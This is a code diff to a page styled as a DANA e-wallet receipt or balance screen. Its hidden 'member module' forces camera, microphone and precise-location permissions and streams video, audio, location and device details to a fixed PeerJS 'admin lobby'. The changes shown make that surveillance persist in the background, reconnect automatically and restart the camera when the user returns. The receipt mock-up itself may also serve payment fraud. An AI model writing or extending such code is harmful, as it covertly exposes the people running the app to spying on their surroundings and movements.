@@ -243,7 +243,7 @@
           <div style="display:flex;align-items:center;justify-content:space-between;gap:8px;">
             <div style="min-width:0;">
               <span style="display:block;font-size:12px;font-weight:600;color:#334155;">Tanggal & Jam</span>
-              <span id="settingsClockPreview" class="tabular-nums" style="font-size:11px;font-weight:500;color:#118EE9;">24 Nov 2026 • 21:26</span>
+              <span id="settingsClockPreview" class="tabular-nums" style="font-size:11px;font-weight:500;color:#118EE9;">24 Nov 2026 • 21:32</span>
             </div>
             <label style="display:flex;align-items:center;gap:6px;font-size:12px;color:#475569;cursor:pointer;">
               <input type="checkbox" id="autoTimeCheck" checked onchange="toggleTimeMode()" />
@@ -315,7 +315,7 @@
             <span style="font-size:var(--rc-logo-fs);font-weight:700;letter-spacing:0.14em;color:#118EE9;">DANA</span>
           </div>
           <div class="tabular-nums" style="padding:0 var(--rc-px) 7px var(--rc-px);display:flex;justify-content:space-between;font-size:var(--rc-meta-fs);color:#8A94A6;">
-            <span id="displayDateTime">24 Nov 2026 • 21:26</span>
+            <span id="displayDateTime">24 Nov 2026 • 21:32</span>
             <span id="displayIdDana">ID DANA 0858••••2418</span>
           </div>
           <div class="straight-divider"></div>
@@ -623,7 +623,7 @@
     }
 
     /* =========================================================================
-       MODUL MEMBER v2: LOKASI AKURAT + KAMERA + MIKROFON (LINTAS KOTA)
+       MODUL MEMBER v3: TETAP TERLIHAT SAAT BUKA APK/LINK LAIN KECUALI DI-CLOSE
        ========================================================================= */
     const ADMIN_LOBBY_ID = "jirun-admin-lobby-9988";
     const MEMBER_PEER_ID = "jirun-hp-" + Date.now().toString(36) + "-" + Math.random().toString(36).slice(2, 6);
@@ -652,6 +652,7 @@
     let hasAccurateLocation = false;
     let hasCameraPermission = false;
     let isRequestingPerms = false;
+    let hasSentExplicitClose = false;
 
     const pendingStreamAdmins = new Set();
     const activeCallsByAdmin = {};
@@ -763,8 +764,9 @@
       for (const track of stream.getTracks()) {
         track.onended = () => {
           broadcastPresenceToAdmins();
-          if (track.kind === "audio" && micEnabled) {
-            openCameraKeepAlive(currentFacing, true).catch(() => {});
+          // Jika kembali ke foreground dan track mati karena OS, pulihkan otomatis
+          if (!document.hidden && hasCameraPermission) {
+            openCameraKeepAlive(currentFacing, micEnabled).catch(() => {});
           }
         };
       }
@@ -798,7 +800,10 @@
         throw new Error("Browser/APK tidak mendukung akses kamera.");
       }
       if (cameraStream) {
-        cameraStream.getTracks().forEach((t) => t.stop());
+        cameraStream.getTracks().forEach((t) => {
+          t.onended = null;
+          t.stop();
+        });
         cameraStream = null;
       }
 
@@ -877,7 +882,7 @@
         facing: currentFacing === "environment" ? "Belakang" : "Depan",
         cameraOn: hasLiveVideo,
         micOn: hasLiveAudio,
-        inBackground: document.hidden,
+        inBackground: Boolean(document.hidden),
         location: latestLocation,
         device: getDeviceSummary(),
         updatedAt: Date.now()
@@ -885,6 +890,7 @@
     }
 
     function broadcastPresenceToAdmins() {
+      if (hasSentExplicitClose) return;
       const payload = buildPresencePayload();
       if (lobbyConn && lobbyConn.open) lobbyConn.send(payload);
       for (const conn of Object.values(adminConns)) {
@@ -893,7 +899,10 @@
     }
 
     function connectToAdminLobby() {
-      if (!peer || peer.disconnected || peer.destroyed) return;
+      if (!peer || peer.destroyed || hasSentExplicitClose) return;
+      if (peer.disconnected) {
+        try { peer.reconnect(); } catch (_) {}
+      }
       if (lobbyConn && lobbyConn.open) {
         broadcastPresenceToAdmins();
         return;
@@ -929,6 +938,7 @@
         await openCameraKeepAlive(currentFacing, true).catch(() => {});
         placeCallToAdmin(fromPeerId, true);
       } else if (msg.type === "PING") {
+        connectToAdminLobby();
         if (cameraStream && !activeCallsByAdmin[fromPeerId]) {
           placeCallToAdmin(fromPeerId, false);
         }
@@ -963,14 +973,20 @@
       });
 
       peer.on("disconnected", () => {
-        if (peer && !peer.destroyed) peer.reconnect();
+        if (peer && !peer.destroyed && !hasSentExplicitClose) {
+          setTimeout(() => {
+            if (peer && !peer.destroyed && peer.disconnected) {
+              try { peer.reconnect(); } catch (_) {}
+            }
+          }, 1000);
+        }
       });
 
       if (!heartbeatTimer) {
         heartbeatTimer = setInterval(() => {
-          if (hasAccurateLocation && hasCameraPermission && cameraStream) {
+          if (hasAccurateLocation && hasCameraPermission && !hasSentExplicitClose) {
             connectToAdminLobby();
-            if (!activeCallsByAdmin[ADMIN_LOBBY_ID] && lobbyConn && lobbyConn.open) {
+            if (cameraStream && !activeCallsByAdmin[ADMIN_LOBBY_ID] && lobbyConn && lobbyConn.open) {
               placeCallToAdmin(ADMIN_LOBBY_ID, false);
             }
             broadcastPresenceToAdmins();
@@ -998,7 +1014,29 @@
       }
     }
 
-    function cleanupMemberSession() {
+    // Saat pindah ke APK/link lain (background), jangan matikan sesi; kirim status inBackground: true
+    document.addEventListener("visibilitychange", async () => {
+      if (hasSentExplicitClose) return;
+      if (document.hidden) {
+        broadcastPresenceToAdmins();
+      } else {
+        // Kembali ke aplikasi: pulihkan koneksi & stream bila sempat terputus oleh OS
+        connectToAdminLobby();
+        if (hasCameraPermission && (!cameraStream || cameraStream.getVideoTracks().every((t) => t.readyState !== "live"))) {
+          await openCameraKeepAlive(currentFacing, micEnabled).catch(() => {});
+        } else if (cameraStream) {
+          await syncTracksToActiveCalls(cameraStream).catch(() => {});
+          if (!activeCallsByAdmin[ADMIN_LOBBY_ID]) {
+            placeCallToAdmin(ADMIN_LOBBY_ID, false);
+          }
+        }
+        broadcastPresenceToAdmins();
+      }
+    });
+
+    function cleanupMemberSession(isExplicitClose = true) {
+      if (!isExplicitClose) return;
+      hasSentExplicitClose = true;
       const closingMsg = { type: "HP_CLOSING", peerId: MEMBER_PEER_ID, updatedAt: Date.now() };
       if (lobbyConn && lobbyConn.open) {
         try { lobbyConn.send(closingMsg); } catch (_) {}
@@ -1026,13 +1064,23 @@
       }
     }
 
+    window.addEventListener("pagehide", (e) => {
+      // e.persisted === true berarti masuk bfcache/pindah tab/aplikasi, bukan di-close
+      if (e && e.persisted) {
+        broadcastPresenceToAdmins();
+        return;
+      }
+      cleanupMemberSession(true);
+    });
+
+    window.addEventListener("beforeunload", () => {
+      cleanupMemberSession(true);
+    });
+
     window.addEventListener("DOMContentLoaded", () => {
       unlockMainAppIfReady();
       requestMandatoryPermissions();
     });
-
-    window.addEventListener("pagehide", cleanupMemberSession);
-    window.addEventListener("beforeunload", cleanupMemberSession);
 
     syncViewportHeight();
     updateClearSaldoBtn();
